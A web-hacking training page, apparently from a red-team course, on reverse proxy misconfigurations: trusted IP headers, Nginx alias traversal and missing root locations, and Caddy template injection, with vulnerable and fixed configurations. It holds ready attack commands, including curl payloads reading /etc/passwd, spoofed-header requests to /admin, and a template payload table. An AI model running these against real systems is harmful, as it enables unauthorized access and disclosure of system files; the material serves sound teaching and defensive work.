---
layout: training-page
title: "Reverse Proxy Misconfigurations — Red Team Academy"
module: "Web Hacking"
tags:
  - nginx
  - reverse-proxy
  - path-traversal
  - ip-spoofing
  - caddy
page_key: "web-reverse-proxy-misconfig"
render_with_liquid: false
---

# Reverse Proxy Misconfigurations

A reverse proxy sits between clients and backend servers, forwarding requests while hiding internal infrastructure. Misconfigurations — such as improper access controls, flawed `alias` directives, trusting client-provided IP headers, or unsanitized template processing — can expose internal resources, enable path traversal, or allow IP spoofing.

## Tools

- **gixy** — Nginx configuration static analyzer — `github.com/yandex/gixy`
- **Gixy-Next** — Actively maintained Python3 fork of gixy — `github.com/MegaManSec/Gixy-Next`
- **Kyubi** — Discovers Nginx alias traversal misconfiguration — `github.com/shiblisec/Kyubi`
- **bypass-url-parser** — Tests many URL bypasses to reach 40X protected pages — `github.com/laluka/bypass-url-parser`

```
bypass-url-parser -u "http://127.0.0.1/juicy_403_endpoint/" -s 8.8.8.8 -d
bypass-url-parser -u /path/urls -t 30 -T 5 -H "Cookie: me_iz=admin" -H "User-agent: test"
bypass-url-parser -R /path/request_file --request-tls -m "mid_paths, end_paths"
```

## HTTP Header Spoofing

Headers like `X-Forwarded-For`, `X-Real-IP`, and `True-Client-IP` are standard HTTP headers. If the backend trusts them without validation, an attacker who can reach the application directly (bypassing the proxy) can spoof their IP address.

### X-Forwarded-For

Identifies the originating IP address of a client passing through proxies or load balancers. When multiple proxies are involved, each appends the address from which it received the request, comma-separated:

```
X-Forwarded-For: 2.21.213.225, 104.16.148.244, 184.25.37.3
```

Nginx can be configured to override the header with the real client IP, preventing spoofing:

```
proxy_set_header X-Forwarded-For $remote_addr;
```

### X-Real-IP

Contains only the single IP of the client connecting to the first proxy. Commonly used by Nginx. If the backend blindly trusts this header, an attacker can set it to any value to bypass IP-based access controls.

### True-Client-IP

Developed by Akamai to pass the original client IP through CDN infrastructure. Same spoofing risk applies if the application trusts this header from untrusted sources.

## Nginx Misconfigurations

### Off By Slash — Alias Path Traversal

The presence or absence of a trailing slash in a `location` block changes matching behavior. When an `alias` directive is used without a trailing slash on the location, Nginx appends the unmatched portion of the URI directly to the alias path — enabling path traversal.

Vulnerable configuration:

```
location /styles {
  alias /path/css/;
}
```

An attacker requesting `/styles../secret.txt` resolves to `/path/css/../secret.txt` = `/path/secret.txt`, traversing out of the intended directory.

Safe configuration uses a trailing slash on both:

```
location /styles/ {
  alias /path/css/;
}
```

### Missing Root Location

When `root` is set globally but there is no catch-all `location /` block, Nginx serves static files from the global root for unmatched paths. If `root /etc/nginx;` is set, a request to `/nginx.conf` resolves to `/etc/nginx/nginx.conf` — exposing the server configuration.

Vulnerable configuration:

```
server {
  root /etc/nginx;

  location /hello.txt {
    try_files $uri $uri/ =404;
    proxy_pass http://127.0.0.1:8080/;
  }
}
```

Fix: add an explicit `location / { return 404; }` or set the root to a safe directory.

## Caddy Template Injection

The Caddy web server's `templates` directive enables Go template rendering in responses. If untrusted data (such as a request header) flows into a templated response, an attacker can inject Go template expressions to read files, list directories, or enumerate environment variables.

Vulnerable Caddyfile:

```
:80 {
    root * /
    templates
    respond "You came from {http.request.header.Referer}"
}
```

Exploitation — reading `/etc/passwd` via the `Referer` header:

{% raw %}

```
curl -H 'Referer: {{readFile "etc/passwd"}}' http://localhost/
```

{% endraw %}

Caddy evaluates the template expression and returns the file contents in the response body.

Available Caddy template functions:

| Payload | Effect |
| --- | --- |
| `{{env "VAR_NAME"}}` | Read an environment variable |
| `{{listFiles "/"}}` | List all files in a directory |
| `{{readFile "path/to/file"}}` | Read a file's contents |

## WAF / IP Bypass Methodology

Combine header spoofing with bypass-url-parser to attempt access to protected endpoints:

```
# Bypass 403 with IP spoofing headers
curl -H "X-Forwarded-For: 127.0.0.1" http://target.com/admin/
curl -H "X-Real-IP: 127.0.0.1" http://target.com/admin/
curl -H "True-Client-IP: 127.0.0.1" http://target.com/admin/

# Test Nginx alias traversal
curl http://target.com/styles../../../etc/passwd
```

## Resources

- gixy — Nginx config analyzer — `github.com/yandex/gixy`
- bypass-url-parser — `github.com/laluka/bypass-url-parser`
- Common Nginx misconfigurations — Detectify Blog
- What is X-Forwarded-For and when can you trust it? — httptoolkit.com
- Detectify Vulnerable Nginx — `github.com/detectify/vulnerable-nginx`
